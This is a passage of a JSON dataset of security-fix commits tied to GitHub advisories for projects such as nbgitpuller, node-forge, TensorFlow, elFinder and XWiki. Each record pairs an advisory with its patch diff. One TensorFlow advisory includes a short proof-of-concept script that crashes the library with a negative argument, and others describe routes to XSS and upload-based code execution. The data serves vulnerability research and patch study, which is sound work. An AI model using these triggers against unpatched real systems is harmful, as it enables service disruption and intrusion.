      "chain_ord": "['07690644f29a566011dd0d7ba14cae3eb0490481']",
      "before_first_fix_commit": "{'f25d3f2685035c11bd668d48e71caf4fc245ba68', '2cad6147f1769a962f8d0733045967663add53cb'}",
      "last_fix_commit": "07690644f29a566011dd0d7ba14cae3eb0490481",
      "chain_ord_pos": 1.0,
      "commit_datetime": "08/25/2021, 12:23:02",
      "message": "Merge pull request from GHSA-mq5p-2mcr-m52j\n\nmake positional args explicit",
      "author": "Erik Sundell",
      "comments": null,
      "stats": "{'additions': 4, 'deletions': 4, 'total': 8}",
      "files": "{'nbgitpuller/pull.py': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https://github.com/jupyterhub/nbgitpuller/raw/07690644f29a566011dd0d7ba14cae3eb0490481/nbgitpuller%2Fpull.py', 'patch': '@@ -88,13 +88,13 @@ def branch_exists(self, branch):\\n         \"\"\"\\n         try:\\n             heads = subprocess.run(\\n-                [\"git\", \"ls-remote\", \"--heads\", self.git_url],\\n+                [\"git\", \"ls-remote\", \"--heads\", \"--\", self.git_url],\\n                 capture_output=True,\\n                 text=True,\\n                 check=True\\n             )\\n             tags = subprocess.run(\\n-                [\"git\", \"ls-remote\", \"--tags\", self.git_url],\\n+                [\"git\", \"ls-remote\", \"--tags\", \"--\", self.git_url],\\n                 capture_output=True,\\n                 text=True,\\n                 check=True\\n@@ -118,7 +118,7 @@ def resolve_default_branch(self):\\n         \"\"\"\\n         try:\\n             head_branch = subprocess.run(\\n-                [\"git\", \"ls-remote\", \"--symref\", self.git_url, \"HEAD\"],\\n+                [\"git\", \"ls-remote\", \"--symref\", \"--\", self.git_url, \"HEAD\"],\\n                 capture_output=True,\\n                 text=True,\\n                 check=True\\n@@ -154,7 +154,7 @@ def initialize_repo(self):\\n         if self.depth and self.depth > 0:\\n             clone_args.extend([\\'--depth\\', str(self.depth)])\\n         clone_args.extend([\\'--branch\\', self.branch_name])\\n-        clone_args.extend([self.git_url, self.repo_dir])\\n+        clone_args.extend([\"--\", self.git_url, self.repo_dir])\\n         yield from execute_cmd(clone_args)\\n         logging.info(\\'Repo {} initialized\\'.format(self.repo_dir))'}}",
      "message_norm": "merge pull request from ghsa-mq5p-2mcr-m52j\n\nmake positional args explicit",
      "language": "ca",
      "entities": "[('ghsa-mq5p-2mcr-m52j', 'VULNID', 'GHSA')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['nbgitpuller/pull.py'])",
      "num_files": 1.0
    },
    {
      "index": 130,
      "vuln_id": "GHSA-2r2c-g63r-vccr",
      "cwe_id": "{'CWE-347'}",
      "score": 5.3,
      "chain": "{'https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1', 'https://github.com/digitalbazaar/forge/commit/bb822c02df0b61211836472e29b9790cc541cdb2'}",
      "dataset": "osv",
      "summary": "Improper Verification of Cryptographic Signature in `node-forge` ### Impact\n\nRSA PKCS#1 v1.5 signature verification code is not properly checking `DigestInfo` for a proper ASN.1 structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https://github.com/digitalbazaar/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)",
      "published_date": "2022-03-18",
      "chain_len": 2,
      "project": "https://github.com/digitalbazaar/forge",
      "commit_href": "https://github.com/digitalbazaar/forge/commit/bb822c02df0b61211836472e29b9790cc541cdb2",
      "commit_sha": "bb822c02df0b61211836472e29b9790cc541cdb2",
      "patch": "MULTI",
      "chain_ord": "['3f0b49a0573ef1bb7af7f5673c0cfebf00424df1', 'bb822c02df0b61211836472e29b9790cc541cdb2']",
      "before_first_fix_commit": "{'d4395fec831622837ecfec9e428d4620e208f9a8'}",
      "last_fix_commit": "bb822c02df0b61211836472e29b9790cc541cdb2",
      "chain_ord_pos": 2.0,
      "commit_datetime": "03/17/2022, 22:54:51",
      "message": "Add advisory links.",
      "author": "David I. Lehn",
      "comments": null,
      "stats": "{'additions': 6, 'deletions': 0, 'total': 6}",
      "files": "{'CHANGELOG.md': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https://github.com/digitalbazaar/forge/raw/bb822c02df0b61211836472e29b9790cc541cdb2/CHANGELOG.md', 'patch': '@@ -15,6 +15,8 @@ Forge ChangeLog\\n     [\"Bleichenbacher\\'s RSA signature forgery based on implementation\\n     error\"](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/)\\n     by Hal Finney.\\n+  - CVE ID: [CVE-2022-24771](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24771)\\n+  - GHSA ID: [GHSA-cfm4-qjh2-4765](https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765)\\n - **HIGH**: Failing to check tailing garbage bytes can lead to signature\\n   forgery.\\n   - The code does not check for tailing garbage bytes after decoding a\\n@@ -24,10 +26,14 @@ Forge ChangeLog\\n     signature forgery based on implementation\\n     error\"](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/)\\n     by Hal Finney.\\n+  - CVE ID: [CVE-2022-24772](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24772)\\n+  - GHSA ID: [GHSA-x4jg-mjrx-434g](https://github.com/digitalbazaar/forge/security/advisories/GHSA-x4jg-mjrx-434g)\\n - **MEDIUM**: Leniency in checking type octet.\\n   - `DigestInfo` is not properly checked for proper ASN.1 structure. This can\\n     lead to successful verification with signatures that contain invalid\\n     structures but a valid digest.\\n+  - CVE ID: [CVE-2022-24773](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24773)\\n+  - GHSA ID: [GHSA-2r2c-g63r-vccr](https://github.com/digitalbazaar/forge/security/advisories/GHSA-2r2c-g63r-vccr)\\n \\n ### Fixed\\n - [asn1] Add fallback to pretty print invalid UTF8 data.'}}",
      "message_norm": "add advisory links.",
      "language": "sv",
      "entities": "[('add', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['CHANGELOG.md'])",
      "num_files": 1.0
    },
    {
      "index": 1437,
      "vuln_id": "GHSA-9vwf-54m9-gc4f",
      "cwe_id": "{'CWE-862', 'CWE-284'}",
      "score": 4.3,
      "chain": "{'https://github.com/snipe/snipe-it/commit/1699c09758e56f740437674a8d6ba36443399f24'}",
      "dataset": "osv",
      "summary": "snipe-it is vulnerable to Improper Access Control snipe-it prior to version 5.3.4 is vulnerable to Improper Access Control. Regular users with `DENY` set to all models permissions can still view model information via the /models/{id}/clone endpoint due to no authorize('view') permission being set.",
      "published_date": "2021-12-16",
      "chain_len": 1,
      "project": "https://github.com/snipe/snipe-it",
      "commit_href": "https://github.com/snipe/snipe-it/commit/1699c09758e56f740437674a8d6ba36443399f24",
      "commit_sha": "1699c09758e56f740437674a8d6ba36443399f24",
      "patch": "SINGLE",
      "chain_ord": "['1699c09758e56f740437674a8d6ba36443399f24']",
      "before_first_fix_commit": "{'918e7c8dae4d41935f534901a582ea8488bbf603'}",
      "last_fix_commit": "1699c09758e56f740437674a8d6ba36443399f24",
      "chain_ord_pos": 1.0,
      "commit_datetime": "12/09/2021, 13:42:18",
      "message": "Update AssetModelsController.php",
      "author": "Haxatron",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'app/Http/Controllers/AssetModelsController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/snipe/snipe-it/raw/1699c09758e56f740437674a8d6ba36443399f24/app%2FHttp%2FControllers%2FAssetModelsController.php', 'patch': \"@@ -269,7 +269,7 @@ public function show($modelId = null)\\n     */\\n     public function getClone($modelId = null)\\n     {\\n-        $this->authorize('view', AssetModel::class);\\n+        $this->authorize('create', AssetModel::class);\\n         // Check if the model exists\\n         if (is_null($model_to_clone = AssetModel::find($modelId))) {\\n             return redirect()->route('models.index')->with('error', trans('admin/models/message.does_not_exist'));\"}}",
      "message_norm": "update assetmodelscontroller.php",
      "language": "it",
      "entities": "[('update', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['app/Http/Controllers/AssetModelsController.php'])",
      "num_files": 1.0
    },
    {
      "index": 2951,
      "vuln_id": "GHSA-rh9j-f5f8-rvgc",
      "cwe_id": "{'CWE-295', 'CWE-287'}",
      "score": 8.6,
      "chain": "{'https://github.com/parse-community/parse-server/commit/ba2b0a9cb9a568817a114b132a4c2e0911d76df1', 'https://github.com/parse-community/parse-server/pull/8054/commits/0cc299f82e367518f2fe7a53b99f3f801a338cf4', 'https://github.com/parse-community/parse-server/pull/8054/commits/2084b7c569697a5230e42511799eeac9219db5a9'}",
      "dataset": "osv",
      "summary": "Authentication bypass vulnerability in Apple Game Center auth adapter  ### Impact\nThe certificate in Apple Game Center auth adapter not validated. As a result, authentication could potentially be bypassed by making a fake certificate accessible via certain Apple domains and providing the URL to that certificate in an authData object.\n\n### Patches\nTo prevent this, a new `rootCertificateUrl` property is introduced to the Parse Server Apple Game Center auth adapter which takes the URL to the root certificate of Apple's Game Center authentication certificate. If no value is set, the `rootCertificateUrl` property defaults to the URL of the [current root certificate](https://developer.apple.com/news/?id=stttq465) as of May 27, 2022.\n\nKeep in mind that the root certificate can change at any time (expected to be announced by Apple) and that it is the developer's responsibility to keep the root certificate URL up-to-date when using the Parse Server Apple Game Center auth adapter.\n\n### Workarounds\nNone.\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-rh9j-f5f8-rvgc\n- https://developer.apple.com/news/?id=stttq465\n- https://github.com/parse-community/parse-server\n\n### More information\n* For questions or comments about this vulnerability visit our [community forum](http://community.parseplatform.org) or [community chat](http://chat.parseplatform.org)\n* Report other vulnerabilities at [report.parseplatform.org](https://report.parseplatform.org)",
      "published_date": "2022-06-17",
      "chain_len": 3,
      "project": "https://github.com/parse-community/parse-server",
      "commit_href": "https://github.com/parse-community/parse-server/pull/8054/commits/2084b7c569697a5230e42511799eeac9219db5a9",
      "commit_sha": "2084b7c569697a5230e42511799eeac9219db5a9",
      "patch": "MULTI",
      "chain_ord": "['2084b7c569697a5230e42511799eeac9219db5a9', '0cc299f82e367518f2fe7a53b99f3f801a338cf4', 'ba2b0a9cb9a568817a114b132a4c2e0911d76df1']",
      "before_first_fix_commit": "{'a8aef820afa2c8d87683668c2961e523016bad9b'}",
      "last_fix_commit": "ba2b0a9cb9a568817a114b132a4c2e0911d76df1",
      "chain_ord_pos": 1.0,
      "commit_datetime": "06/17/2022, 14:16:52",
      "message": "Create game_center.pem",
      "author": "Manuel Trezza",
      "comments": null,
      "stats": "{'additions': 28, 'deletions': 0, 'total': 28}",
      "files": "{'spec/support/cert/game_center.pem': {'additions': 28, 'deletions': 0, 'changes': 28, 'status': 'added', 'raw_url': 'https://github.com/parse-community/parse-server/raw/2084b7c569697a5230e42511799eeac9219db5a9/spec%2Fsupport%2Fcert%2Fgame_center.pem', 'patch': '@@ -0,0 +1,28 @@\\n+-----BEGIN CERTIFICATE-----\\n+MIIEvDCCA6SgAwIBAgIQXRHxNXkw1L9z5/3EZ/T/hDANBgkqhkiG9w0BAQsFADB/\\n+MQswCQYDVQQGEwJVUzEdMBsGA1UEChMUU3ltYW50ZWMgQ29ycG9yYXRpb24xHzAd\\n+BgNVBAsTFlN5bWFudGVjIFRydXN0IE5ldHdvcmsxMDAuBgNVBAMTJ1N5bWFudGVj\\n+IENsYXNzIDMgU0hBMjU2IENvZGUgU2lnbmluZyBDQTAeFw0xODA5MTcwMDAwMDBa\\n+Fw0xOTA5MTcyMzU5NTlaMHMxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9y\\n+bmlhMRIwEAYDVQQHDAlDdXBlcnRpbm8xFDASBgNVBAoMC0FwcGxlLCBJbmMuMQ8w\\n+DQYDVQQLDAZHQyBTUkUxFDASBgNVBAMMC0FwcGxlLCBJbmMuMIIBIjANBgkqhkiG\\n+9w0BAQEFAAOCAQ8AMIIBCgKCAQEA06fwIi8fgKrTQu7cBcFkJVF6+Tqvkg7MKJTM\\n+IOYPPQtPF3AZYPsbUoRKAD7/JXrxxOSVJ7vU1mP77tYG8TcUteZ3sAwvt2dkRbm7\\n+ZO6DcmSggv1Dg4k3goNw4GYyCY4Z2/8JSmsQ80Iv/UOOwynpBziEeZmJ4uck6zlA\\n+17cDkH48LBpKylaqthym5bFs9gj11pto7mvyb5BTcVuohwi6qosvbs/4VGbC2Nsz\\n+ie416nUZfv+xxoXH995gxR2mw5cDdeCew7pSKxEhvYjT2nVdQF0q/hnPMFnOaEyT\\n+q79n3gwFXyt0dy8eP6KBF7EW9J6b7ubu/j7h+tQfxPM+gTXOBQIDAQABo4IBPjCC\\n+ATowCQYDVR0TBAIwADAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUH\\n+AwMwYQYDVR0gBFowWDBWBgZngQwBBAEwTDAjBggrBgEFBQcCARYXaHR0cHM6Ly9k\\n+LnN5bWNiLmNvbS9jcHMwJQYIKwYBBQUHAgIwGQwXaHR0cHM6Ly9kLnN5bWNiLmNv\\n+bS9ycGEwHwYDVR0jBBgwFoAUljtT8Hkzl699g+8uK8zKt4YecmYwKwYDVR0fBCQw\\n+IjAgoB6gHIYaaHR0cDovL3N2LnN5bWNiLmNvbS9zdi5jcmwwVwYIKwYBBQUHAQEE\\n+SzBJMB8GCCsGAQUFBzABhhNodHRwOi8vc3Yuc3ltY2QuY29tMCYGCCsGAQUFBzAC\\n+hhpodHRwOi8vc3Yuc3ltY2IuY29tL3N2LmNydDANBgkqhkiG9w0BAQsFAAOCAQEA\\n+I/j/PcCNPebSAGrcqSFBSa2mmbusOX01eVBg8X0G/z8Z+ZWUfGFzDG0GQf89MPxV\\n+woec+nZuqui7o9Bg8s8JbHV0TC52X14CbTj9w/qBF748WbH9gAaTkrJYPm+MlNhu\\n+tjEuQdNl/YXVMvQW4O8UMHTi09GyJQ0NC4q92Wxvx1m/qzjvTLvrXHGQ9pEHhPyz\\n+vfBLxQkWpNoCNKU7UeESyH06XOrGc9MsII9deeKsDJp9a0jtx+pP4MFVtFME9SSQ\\n+tMBs0It7WwEf7qcRLpialxKwY2EzQ9g4WnANHqo18PrDBE10TFpZPzUh7JhMViVr\\n+EEbl0YdElmF8Hlamah/yNw==\\n+-----END CERTIFICATE-----'}}",
      "message_norm": "create game_center.pem",
      "language": "ro",
      "entities": null,
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['spec/support/cert/game_center.pem'])",
      "num_files": 1.0
    },
    {
      "index": 1868,
      "vuln_id": "GHSA-gf88-j2mg-cc82",
      "cwe_id": "{'CWE-681'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992'}",
      "dataset": "osv",
      "summary": "Crash caused by integer conversion to unsigned ### Impact\nAn attacker can cause a denial of service in `boosted_trees_create_quantile_stream_resource` by using negative arguments:\n\n```python\nimport tensorflow as tf\nfrom tensorflow.python.ops import gen_boosted_trees_ops\nimport numpy as np\n\nv= tf.Variable([0.0, 0.0, 0.0, 0.0, 0.0])\ngen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource(\n  quantile_stream_resource_handle = v.handle,\n  epsilon = [74.82224],\n  num_streams = [-49], \n  max_elements = np.int32(586))\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/quantile_ops.cc#L96) does not validate that `num_streams` only contains non-negative numbers. In turn, [this results in using this value to allocate memory](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/quantiles/quantile_stream_resource.h#L31-L40):\n\n```cc\nclass BoostedTreesQuantileStreamResource : public ResourceBase {\n public:\n  BoostedTreesQuantileStreamResource(const float epsilon,\n                                     const int64 max_elements,\n                                     const int64 num_streams)\n      : are_buckets_ready_(false),\n        epsilon_(epsilon),\n        num_streams_(num_streams),\n        max_elements_(max_elements) {\n    streams_.reserve(num_streams_);\n    ...\n  }\n}\n```\n\nHowever, `reserve` receives an unsigned integer so there is an implicit conversion from a negative value to a large positive unsigned. This results in a crash from the standard library.\n\n### Patches\nWe have patched the issue in GitHub commit [8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992](https://github.com/tensorflow/tensorflow/commit/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
      "published_date": "2021-08-25",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992",
      "commit_sha": "8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992",
      "patch": "SINGLE",
      "chain_ord": "['8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992']",
      "before_first_fix_commit": "{'f8a1ac8d75f9b3d00c90148ca1e91b735b6d542c'}",
      "last_fix_commit": "8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992",
      "chain_ord_pos": 1.0,
      "commit_datetime": "07/28/2021, 22:34:04",
      "message": "Ensure num_streams >= 0 in tf.raw_ops.BoostedTreesCreateQuantileStreamResource\n\nPiperOrigin-RevId: 387452765\nChange-Id: I9990c760e177fabca6a3b9b4612ceeaeeba51495",
      "author": "Laura Pak",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 0, 'total': 3}",
      "files": "{'tensorflow/core/kernels/boosted_trees/quantile_ops.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992/tensorflow%2Fcore%2Fkernels%2Fboosted_trees%2Fquantile_ops.cc', 'patch': '@@ -116,6 +116,9 @@ class BoostedTreesCreateQuantileStreamResourceOp : public OpKernel {\\n     const Tensor* num_streams_t;\\n     OP_REQUIRES_OK(context, context->input(kNumStreamsName, &num_streams_t));\\n     int64_t num_streams = num_streams_t->scalar<int64>()();\\n+    OP_REQUIRES(context, num_streams >= 0,\\n+                errors::InvalidArgument(\\n+                    \"Num_streams input cannot be a negative integer\"));\\n \\n     auto result =\\n         new QuantileStreamResource(epsilon, max_elements_, num_streams);'}}",
      "message_norm": "ensure num_streams >= 0 in tf.raw_ops.boostedtreescreatequantilestreamresource\n\npiperorigin-revid: 387452765\nchange-id: i9990c760e177fabca6a3b9b4612ceeaeeba51495",
      "language": "en",
      "entities": "[('ensure', 'ACTION', ''), ('387452765', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/boosted_trees/quantile_ops.cc'])",
      "num_files": 1.0
    },
    {
      "index": 2779,
      "vuln_id": "GHSA-qm58-cvvm-c5qr",
      "cwe_id": "{'CWE-434'}",
      "score": 8.1,
      "chain": "{'https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1'}",
      "dataset": "osv",
      "summary": "elFinder unsafe upload filtering leading to remote code execution ### Impact\n\nBefore elFinder 2.1.58, the upload filter did not disallow the upload of `.phar` files. As several Linux distributions are now shipping Apache configured in a way it will process these files as PHP scripts, attackers could gain arbitrary code execution on the server hosting the PHP connector (even in minimal configuration).\n\n### Patches\n\nThe issue has been addressed with https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1, associating `.phar` files to the right MIME type. Unless explicitly allowed in the configuration, such files cannot be uploaded anymore. This patch is part of the last release of elFinder, 2.1.58.\n\n### Workarounds\n\nIf you can't update to 2.1.58, make sure your connector is not exposed without authentication.\n\n### Important tips\n\nServer-side scripts can often be created as text files. Currently, elFinder has an appropriate MIME type set for file extensions that are generally runnable on a web server.\n\nHowever, the server has various settings. In some cases, the executable file may be judged as \"text/plain\". Therefore, elFinder installers should understand the extensions that can be executed on the web server where elFinder is installed, and check if there are any missing items in the elFinder settings.\n\nThe elFinder PHP connector has an option \"additionalMimeMap\" that specifies the MIME type for each extension. See [#3295(comment)](https://github.com/Studio-42/elFinder/issues/3295#issuecomment-853042139) for more information.\n\n### References\n\n- https://snyk.io/vuln/composer:studio-42%2Felfinder\n- https://github.com/Studio-42/elFinder/issues/3295\n- Further technical details will be disclosed on https://blog.sonarsource.com/tag/security after some time.\n\n### For more information\n\nIf you have any questions or comments about this advisory, you can contact:\n- The original reporters, by sending an email to  support [at] snyk.io or vulnerability.research [at] sonarsource.com;\n- The maintainers, by opening an issue on this repository.",
      "published_date": "2021-06-15",
      "chain_len": 1,
      "project": "https://github.com/Studio-42/elFinder",
      "commit_href": "https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1",
      "commit_sha": "75ea92decc16a5daf7f618f85dc621d1b534b5e1",
      "patch": "SINGLE",
      "chain_ord": "['75ea92decc16a5daf7f618f85dc621d1b534b5e1']",
      "before_first_fix_commit": "{'6a97635e590b5882bf95f62f8e70e7230bbc625e'}",
      "last_fix_commit": "75ea92decc16a5daf7f618f85dc621d1b534b5e1",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/31/2021, 11:50:39",
      "message": "[VD:abstract] add `'phar:*' => 'text/x-php'` into 'staticMineMap'\n\nrel. #3295",
      "author": "nao-pon",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 0, 'total': 1}",
      "files": "{'php/elFinderVolumeDriver.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https://github.com/Studio-42/elFinder/raw/75ea92decc16a5daf7f618f85dc621d1b534b5e1/php%2FelFinderVolumeDriver.class.php', 'patch': \"@@ -281,6 +281,7 @@ abstract class elFinderVolumeDriver\\n             'php5:*' => 'text/x-php',\\n             'php7:*' => 'text/x-php',\\n             'phtml:*' => 'text/x-php',\\n+            'phar:*' => 'text/x-php',\\n             'cgi:*' => 'text/x-httpd-cgi',\\n             'pl:*' => 'text/x-perl',\\n             'asp:*' => 'text/x-asap',\"}}",
      "message_norm": "[vd:abstract] add `'phar:*' => 'text/x-php'` into 'staticminemap'\n\nrel. #3295",
      "language": "en",
      "entities": "[('add', 'ACTION', ''), ('#3295', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['php/elFinderVolumeDriver.class.php'])",
      "num_files": 1.0
    },
    {
      "index": 2587,
      "vuln_id": "GHSA-ph5x-h23x-7q5q",
      "cwe_id": "{'CWE-79', 'CWE-116'}",
      "score": 7.4,
      "chain": "{'https://github.com/xwiki/xwiki-platform/commit/27f839133d41877e538d35fa88274b50a1c00b9b'}",
      "dataset": "osv",
      "summary": "Cross-site Scripting in wiki manager join wiki page ### Impact\nWe found a possible XSS vector in the `WikiManager.JoinWiki ` wiki page related to the \"requestJoin\" field.\n\n### Patches\nThe issue is patched in versions 12.10.11, 14.0-rc-1, 13.4.7, 13.10.3.\n\n### Workarounds\nThe easiest workaround is to edit the wiki page `WikiManager.JoinWiki` (with wiki editor) and change the line\n\n```\n<input type='hidden' name='requestJoin' value=\"$!request.requestJoin\"/>\n```\n\ninto\n\n```\n<input type='hidden' name='requestJoin' value=\"$escapetool.xml($!request.requestJoin)\">\n```\n\n### References\n  * https://jira.xwiki.org/browse/XWIKI-19292\n  * https://github.com/xwiki/xwiki-platform/commit/27f839133d41877e538d35fa88274b50a1c00b9b\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki](https://jira.xwiki.org)\n* Email us at [security mailing list](mailto:security@xwiki.org)",
      "published_date": "2022-05-25",
      "chain_len": 1,
      "project": "https://github.com/xwiki/xwiki-platform",
      "commit_href": "https://github.com/xwiki/xwiki-platform/commit/27f839133d41877e538d35fa88274b50a1c00b9b",
      "commit_sha": "27f839133d41877e538d35fa88274b50a1c00b9b",
      "patch": "SINGLE",
      "chain_ord": "['27f839133d41877e538d35fa88274b50a1c00b9b']",
      "before_first_fix_commit": "{'bd935320bee3c27cf7548351b1d0f935f116d437'}",
      "last_fix_commit": "27f839133d41877e538d35fa88274b50a1c00b9b",
      "chain_ord_pos": 1.0,
      "commit_datetime": "01/04/2022, 10:35:46",
      "message": "XWIKI-19292: Fix bad escaping",
      "author": "Thomas Mortagne",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'xwiki-platform-core/xwiki-platform-wiki/xwiki-platform-wiki-ui/xwiki-platform-wiki-ui-mainwiki/src/main/resources/WikiManager/JoinWiki.xml': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/xwiki/xwiki-platform/raw/27f839133d41877e538d35fa88274b50a1c00b9b/xwiki-platform-core%2Fxwiki-platform-wiki%2Fxwiki-platform-wiki-ui%2Fxwiki-platform-wiki-ui-mainwiki%2Fsrc%2Fmain%2Fresources%2FWikiManager%2FJoinWiki.xml', 'patch': '@@ -245,7 +245,7 @@\\n                   &lt;a href=\"$backUrl\" class=\\'button secondary\\'&gt;{{translation key=\"platform.wiki.users.join.request.cancel.label\"/}}&lt;/a&gt;\\n                 &lt;/span&gt;\\n                 &lt;input type=\\'hidden\\' name=\\'wikiId\\' value=\"$!wikiId\"/&gt;\\n-                &lt;input type=\\'hidden\\' name=\\'requestJoin\\' value=\"$!request.requestJoin\"/&gt;\\n+                &lt;input type=\\'hidden\\' name=\\'requestJoin\\' value=\"$escapetool.xml($!request.requestJoin)\"/&gt;\\n                 &lt;input type=\"hidden\" name=\"form_token\" value=\"$!escapetool.xml($services.csrf.getToken())\" /&gt;\\n               &lt;/dl&gt;\\n             &lt;/form&gt;'}}",
      "message_norm": "xwiki-19292: fix bad escaping",
      "language": "ca",
      "entities": "[('fix', 'ACTION', ''), ('escaping', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['xwiki-platform-core/xwiki-platform-wiki/xwiki-platform-wiki-ui/xwiki-platform-wiki-ui-mainwiki/src/main/resources/WikiManager/JoinWiki.xml'])",
      "num_files": 1.0
    },
    {
      "index": 1354,
      "vuln_id": "GHSA-9c78-vcq7-7vxq",
      "cwe_id": "{'CWE-787'}",
      "score": 8.8,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6'}",
      "dataset": "osv",
      "summary": "Out of bounds write in TFLite ### Impact \nAn attacker can craft a TFLite model that would cause a write outside of bounds of an array in TFLite. In fact, the attacker can override the linked list used by the memory allocator. This can be leveraged for an arbitrary write primitive under certain conditions.\n\n### Patches\nWe have patched the issue in GitHub commit [6c0b2b70eeee588591680f5b7d5d38175fd7cdf6](https://github.com/tensorflow/tensorflow/commit/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",
      "published_date": "2022-02-09",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6",
      "commit_sha": "6c0b2b70eeee588591680f5b7d5d38175fd7cdf6",
      "patch": "SINGLE",
      "chain_ord": "['6c0b2b70eeee588591680f5b7d5d38175fd7cdf6']",
      "before_first_fix_commit": "{'1de49725a5fc4e48f1a3b902ec3599ee99283043'}",
      "last_fix_commit": "6c0b2b70eeee588591680f5b7d5d38175fd7cdf6",
      "chain_ord_pos": 1.0,
      "commit_datetime": "12/21/2021, 16:50:37",
      "message": "[lite] add validation check for sparse fully connected\n\nPiperOrigin-RevId: 417629354\nChange-Id: If96171c4bd4f5fdb01d6368d6deab19d1c9beca7",
      "author": "Karim Nosir",
      "comments": null,
      "stats": "{'additions': 48, 'deletions': 10, 'total': 58}",
